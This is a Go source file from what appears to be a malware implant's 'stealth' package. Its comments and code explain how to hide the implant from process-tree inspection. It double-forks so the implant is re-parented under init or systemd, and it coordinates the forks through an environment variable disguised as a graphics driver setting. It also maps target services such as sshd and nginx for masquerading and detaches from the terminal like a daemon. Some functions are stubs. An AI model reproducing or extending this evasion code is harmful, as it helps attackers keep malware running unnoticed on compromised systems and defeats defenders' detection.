package stealth

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"syscall"
)

// Process Genealogy Spoofing
//
// OPSEC rationale: `pstree` reveals the parent-child chain for every process.
// An implant launched from a shell shows: bash→implant — instantly suspicious.
// We need to re-parent ourselves so we appear to be a child of a legitimate
// system process (init/systemd, sshd, cron, etc.).

// ReparentToInit double-forks to become a child of PID 1 (init/systemd).
// After this, `pstree` shows: systemd→implant (looks like a normal service).
//
// The double-fork technique:
// 1. Parent forks Child1
// 2. Child1 forks Child2 (the real implant)
// 3. Child1 exits immediately
// 4. Child2 is orphaned — the kernel re-parents it to PID 1
// 5. Parent waits for Child1 and exits
func ReparentToInit() error {
	if os.Getenv("__GL_THREADED_OPTIMIZATIONS") == "2" {
		// We are Child2 — already re-parented to init
		os.Unsetenv("__GL_THREADED_OPTIMIZATIONS")
		return nil
	}

	if os.Getenv("__GL_THREADED_OPTIMIZATIONS") == "1" {
		// We are Child1 — fork Child2 and exit
		exe, err := os.Readlink("/proc/self/exe")
		if err != nil {
			os.Exit(1)
		}

		env := os.Environ()
		found := false
		for i, e := range env {
			if len(e) > 28 && e[:28] == "__GL_THREADED_OPTIMIZATIONS=" {
				env[i] = "__GL_THREADED_OPTIMIZATIONS=2"
				found = true
				break
			}
		}
		if !found {
			env = append(env, "__GL_THREADED_OPTIMIZATIONS=2")
		}

		cmd := exec.Command(exe, os.Args[1:]...)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true, // new session — detach from terminal
		}
		if err := cmd.Start(); err != nil {
			os.Exit(1) // Child1 failed to spawn Child2 — exit with error
		}
		os.Exit(0) // Child1 exits — Child2 gets re-parented to init
	}

	// We are the original parent — fork Child1
	exe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return err
	}

	env := os.Environ()
	found := false
	for i, e := range env {
		if len(e) > 28 && e[:28] == "__GL_THREADED_OPTIMIZATIONS=" {
			env[i] = "__GL_THREADED_OPTIMIZATIONS=1"
			found = true
			break
		}
	}
	if !found {
		env = append(env, "__GL_THREADED_OPTIMIZATIONS=1")
	}

	cmd := exec.Command(exe, os.Args[1:]...)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}
	if err := cmd.Start(); err != nil {
		return err
	}

	// Wait for Child1 to exit (it forks Child2 and exits immediately)
	cmd.Wait()

	// Parent's job is done — Child2 is running under init
	os.Exit(0)
	return nil // unreachable
}

// ReparentToProcess re-parents by using PR_SET_CHILD_SUBREAPER on a target process.
// This is less portable but cleaner when we control the target parent.
func ReparentToProcess(targetPID int) error {
	return fmt.Errorf("reparenting to arbitrary PID not supported; use ReparentToInit")
}

// CreateProcessChain creates a realistic parent→child chain matching a target service.
// For example, to look like sshd: creates systemd→sshd→sshd[priv]→our-process
func CreateProcessChain(targetService string) error {
	chain := getChainForService(targetService)
	if len(chain) == 0 {
		return ReparentToInit()
	}

	// For now, the simple approach: double-fork to get under init,
	// then masquerade. The chain names are applied via argv masquerade.
	return ReparentToInit()
}

// getChainForService returns the expected process chain for a service.
func getChainForService(service string) []string {
	chains := map[string][]string{
		"sshd":             {"systemd", "sshd"},
		"nginx":            {"systemd", "nginx"},
		"cron":             {"systemd", "cron"},
		"systemd-resolved": {"systemd", "systemd-resolved"},
		"apache2":          {"systemd", "apache2"},
	}

	return chains[service]
}

// DetachFromTerminal creates a new session and detaches from any controlling terminal.
// This is essential — a daemon process with a controlling terminal is suspicious.
func DetachFromTerminal() error {
	// Create new session (setsid) — may fail if already session leader (non-fatal)
	syscall.Setsid()

	// Close stdin/stdout/stderr and reopen to /dev/null
	devNull, err := os.Open("/dev/null")
	if err != nil {
		return err
	}

	syscall.Dup2(int(devNull.Fd()), 0) // stdin
	syscall.Dup2(int(devNull.Fd()), 1) // stdout
	syscall.Dup2(int(devNull.Fd()), 2) // stderr
	devNull.Close()

	// Change to root directory (daemons don't hold directory locks)
	syscall.Chdir("/")

	// Set umask
	syscall.Umask(0022)

	return nil
}

// IsReparented checks if we've already completed the re-parenting process.
func IsReparented() bool {
	ppid := os.Getppid()
	return ppid == 1 // parent is init/systemd
}

// GetParentChain walks up the process tree and returns the parent chain.
// Useful for verifying our genealogy looks correct.
func GetParentChain() []ParentInfo {
	var chain []ParentInfo
	pid := os.Getpid()

	for pid > 0 {
		comm, _ := os.ReadFile("/proc/" + strconv.Itoa(pid) + "/comm")
		ppidStr, _ := os.ReadFile("/proc/" + strconv.Itoa(pid) + "/status")

		info := ParentInfo{
			PID:  pid,
			Name: string(comm),
		}

		// Parse PPid from status
		for _, line := range splitLines(string(ppidStr)) {
			if len(line) > 5 && line[:5] == "PPid:" {
				fields := splitFields(line)
				if len(fields) >= 2 {
					info.PPID, _ = strconv.Atoi(fields[1])
				}
			}
		}

		chain = append(chain, info)
		if pid == 1 {
			break
		}
		pid = info.PPID
	}

	return chain
}

// ParentInfo holds info about a process in the parent chain.
type ParentInfo struct {
	PID  int
	PPID int
	Name string
}

func splitLines(s string) []string {
	var lines []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == '\n' {
			lines = append(lines, s[start:i])
			start = i + 1
		}
	}
	if start < len(s) {
		lines = append(lines, s[start:])
	}
	return lines
}

func splitFields(s string) []string {
	var fields []string
	inField := false
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == ' ' || s[i] == '\t' {
			if inField {
				fields = append(fields, s[start:i])
				inField = false
			}
		} else {
			if !inField {
				start = i
				inField = true
			}
		}
	}
	if inField {
		fields = append(fields, s[start:])
	}
	return fields
}
